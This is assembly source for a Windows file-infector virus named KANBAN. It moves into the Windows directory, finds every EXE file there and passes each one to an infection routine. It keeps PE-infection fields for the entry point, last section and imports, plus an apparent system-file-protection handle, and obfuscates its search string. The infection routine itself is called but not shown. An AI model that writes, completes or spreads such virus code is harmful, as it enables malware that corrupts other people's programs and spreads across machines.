   P386
   model flat

   callx MACRO x
   extrn x:proc
   call x
   ENDM

   INVICTUS STRUCT

      _file_attrib            DWORD    ?
      _file_time              DWORD    ?,?,?,?,?,?
      _file_size              DWORD    ?

      hWnd_CreateFile         DWORD ?
      hWnd_CreateFileMapping  DWORD ?
      hWnd_MapViewOfFile      DWORD ?
      hWnd_sfc                DWORD ?

      _access_type            DWORD ?
      _create_flag            DWORD ?
      _map_access_type        DWORD ?
      _mview_access_type      DWORD ?
      _image_nt_header        DWORD ?

      _infect_entry_point     DWORD ?
      _infect_last_section    DWORD ?

      _infect_import_dir_rva  DWORD ?
      _kernel_import_va       DWORD ?
      _import_function        DWORD ?
      _import_GetProcAddress  DWORD ?
      _import_GetKernel       DWORD ?

   INVICTUS ENDS

   DATASEG

   exe dd not 'XE.*'
       db 'E',0

   InvictusPtr       INVICTUS <?>
   FileToInfect      db 260 dup(?)
   CurrentFileName   db 260 dup(?)
   WinPath           db 260 dup(?)
   w32finddata       db 512 dup(?)

   CODESEG

   KANBAN PROC

   not dword ptr [exe]

   push 0
   callx GetModuleHandleA

   push 260
   push offset CurrentFileName
   push eax
   callx GetModuleFileNameA

   push 260
   push offset WinPath
   callx GetWindowsDirectoryA

   push offset WinPath
   callx SetCurrentDirectoryA

   push offset w32finddata
   push offset exe
   callx FindFirstFileA

   mov ebp, eax

   LoopTheMostPlayedFilez:

   mov eax, not 'EXE.'
   not eax
   push offset InvictusPtr
   push offset CurrentFileName
   push eax
   push offset w32finddata + 44
   callx _infect_file

   push offset w32finddata
   push ebp
   callx FindNextFileA

   test eax, eax
   jnz LoopTheMostPlayedFilez

   push ebp
   callx FindClose

   push -1
   callx ExitProcess

   db 'KANBAN'

   KANBAN ENDP
   end KANBAN
   end
